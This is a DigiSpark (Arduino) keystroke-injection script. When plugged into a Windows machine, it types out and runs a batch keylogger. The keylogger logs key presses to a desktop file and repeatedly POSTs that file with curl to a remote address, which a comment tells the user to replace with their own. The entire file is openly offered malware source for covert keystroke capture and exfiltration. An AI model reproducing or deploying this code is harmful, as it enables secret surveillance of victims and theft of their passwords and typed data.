//This DigiSpark script creates a batch keylogger program in cmd and runs in the background
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("cmd /k cd %UserProfile%/Desktop");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
 DigiKeyboard.print(":: Authors: Daniel DeBrun, inspired by https://github.com/TheBATeam/Keylogger-in-Batch-1.0\n\n@echo off\ncls\ntitle Keylogger\nset \"list=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\nset entry=\n:: Replace \'https://example.net\' with your desired address\nstart \"Increment Thread\" cmd /c \"for /l %%i in (1,1,99999999) do (curl -d \"@userprofile%\desktop\keylogger.txt\" -H \"Content-Type: text/plain\" -X POSThttps://example.net & timeout /t 30 /nobreak >nul)\"\n:a\necho.&echo.Check the log file of pressed Keys in ur \"desktop\keylogger.txt\"\nset a=\nchoice /n /c \"%list%\" /CS\nset /a a=%errorlevel%-1\n\n::creating temp. variables and checking which key is pressed....\n\nset temp_list=%list%\nset b=0\n:loop\nif \"%b%\" neq \"%a%\" (\nset temp_list=%temp_list:~1%\nset /a b=%b%+1\ngoto loop\n)\nset \"entry=%entry%%temp_list:~0,1%\"\necho.%entry%>\"%userprofile%\desktop\keylogger.txt\"\ncls\necho.%entry%\ngoto a\n");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("exit");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
 for (;;) {
 /*empty*/
}
}
